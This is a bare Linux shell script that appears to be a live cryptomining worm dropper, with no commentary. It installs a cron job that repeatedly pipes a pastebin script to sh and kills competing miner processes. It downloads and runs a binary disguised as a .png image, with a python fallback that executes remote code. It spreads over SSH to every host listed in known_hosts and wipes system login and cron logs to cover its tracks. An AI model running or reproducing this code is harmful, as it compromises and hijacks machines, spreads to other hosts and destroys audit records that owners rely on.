export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/local/bin:/usr/sbin

mkdir -p /tmp
chmod 1777 /tmp

echo "*/15 * * * * (curl -fsSL hTTps://pastebin.com/raw/XiUrwYe9||wget -q -O- hTTps://pastebin.com/raw/XiUrwYe9)|sh" | crontab -

ps -ef|grep -v grep|grep hwlh3wlh44lh|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep Circle_MI|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep get.bi-chi.com|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep hashvault.pro|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep nanopool.org|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "xmr"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "xig"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "ddgs"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "qW3xT"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "wnTKYg"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "t00ls.ru"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "sustes"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "thisxxs"|awk '{print $2}' | xargs kill -9
ps -ef|grep -v grep|grep "hashfish"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kworkerds"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "/tmp/devtool"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "systemctI"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "sustse"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "axgtbc"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "axgtfa"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "6Tx3Wq"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "dblaunchs"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "/boot/vmlinuz"|awk '{print $2}'|xargs kill -9

rm -rf /tmp/busybox
cd /tmp
touch /usr/local/bin/writeable && cd /usr/local/bin/
touch /usr/libexec/writeable && cd /usr/libexec/
touch /usr/bin/writeable && cd /usr/bin/
rm -rf /usr/local/bin/writeable /usr/libexec/writeable /usr/bin/writeable
export PATH=$PATH:$(pwd)
if [ ! -f "/tmp/.XIMunix" ] || [ ! -f "/proc/$(cat /tmp/.XIMunix)/io" ]; then
    chattr -i kerberods
    rm -rf kerberods
    ARCH=$(uname -m)
    if [ ${ARCH}x = "x86_64x" ]; then
        (curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL img.sobot.com/chatres/89/msg/20190514/895a0891a3c04440a94a407cbd758564.png -o kerberods||wget --timeout=30 --tries=3 -q img.sobot.com/chatres/89/msg/20190514/895a0891a3c04440a94a407cbd758564.png -O kerberods)||python -c "import urllib2;exec(urllib2.urlopen('https://pastebin.com/raw/0DqEa3Gn').read())"
    else
        (curl --connect-timeout 30 --max-time 30 --retry 3 -fsSL img.sobot.com/chatres/89/msg/20190514/b816dde825964d7ca4af0ee7dc43203b.png -o kerberods||wget --timeout=30 --tries=3 -q img.sobot.com/chatres/89/msg/20190514/b816dde825964d7ca4af0ee7dc43203b.png -O kerberods)||python -c "import urllib2;exec(urllib2.urlopen('https://pastebin.com/raw/Xu86DLj0').read())"
    fi
        chmod +x kerberods
        $(pwd)/kerberods || /usr/bin/kerberods || /usr/libexec/kerberods || /usr/local/bin/kerberods || kerberods || ./kerberods || /tmp/kerberods || /usr/sbin/kerberods
fi

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL hTTps://pastebin.com/raw/XiUrwYe9||wget -q -O- hTTps://pastebin.com/raw/XiUrwYe9)|sh >/dev/null 2>&1 &' & done
fi

for file in /home/*
do
    if test -d $file
    then
        if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h '(curl -fsSL hTTps://pastebin.com/raw/XiUrwYe9||wget -q -O- hTTps://pastebin.com/raw/XiUrwYe9)|sh >/dev/null 2>&1 &' & done
        fi
    fi
done

echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
#
